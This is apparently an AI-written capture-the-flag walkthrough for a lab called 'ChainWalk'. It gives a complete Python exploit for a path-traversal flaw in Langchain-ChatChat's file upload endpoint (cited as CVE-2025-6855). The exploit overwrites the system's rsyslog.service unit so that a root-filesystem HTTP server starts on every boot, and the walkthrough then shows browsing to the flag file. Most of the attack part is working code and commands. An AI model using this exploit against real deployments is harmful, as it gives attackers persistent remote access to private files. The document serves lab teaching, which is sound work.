## ChainWalk Walkthrough

### Setup

From your **attacker machine**, navigate to the `walkthrough` directory and ensure you have the **target VM's IP address**.

### Exploit Logic

`exploit.py`:

```python
import requests

url = "http://127.0.0.1:7861/v1/files?purpose=assistants"

service_path = "../../../../../../../../../../etc/systemd/system/rsyslog.service"

service_content = """[Unit]
Description=Evil Python HTTP Server
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 -m http.server 1337
ExecStartPost=/bin/echo "HTTP server running on port 1337"
Restart=always

[Install]
WantedBy=multi-user.target
"""

files = {
    "file": (service_path, service_content, "text/plain")
}
r = requests.post(url, files=files)
print("[+] rsyslog.service hijacked and uploaded:", r.status_code)
```

This exploit targets a **vulnerable file upload endpoint** exposed by Langchain-ChatChat on port `7861`. Specifically:

* The endpoint `/v1/files?purpose=assistants` is vulnerable to **path traversal** (CVE-2025-6855).
* By crafting a filename with `../../../../../`, the script **escapes the upload directory** and writes a file to `/etc/systemd/system/rsyslog.service`.
* Instead of the legitimate system logging service, the overwritten `rsyslog.service` starts a **Python HTTP server** on port `1337` each time the system boots.

Because the VM has no login access, this approach works by **modifying the system startup behavior**. After reboot, the Python server runs automatically — no user login is required.

Once running, this server serves the filesystem from the root directory, giving remote access to files.

### Usage

1. Run the exploit from your attacker machine:

   ```bash
   python3 exploit.py
   ```

2. If successful, you’ll see:

   ```
   [+] rsyslog.service hijacked and uploaded: 200
   ```

3. Now, **reboot the VM** (power it off and turn it back on). No need to log in.


### Step 5: Access the Filesystem

Once the VM restarts, visit the following from your attacker machine:

```
http://<TARGET_VM_IP>:1337
```

You will see a **directory listing of the target machine’s filesystem**, served via Python’s built-in HTTP server.

---

### Step 6: Capture the Flag

Browse to the following path in the web interface:

```
home/vboxuser/chainwalk/build/flag_{CHAINWALK}.txt
```

Download or view the file to capture the flag.

---

Let me know if you want this converted into a `README.md`, PDF, or HTML format.
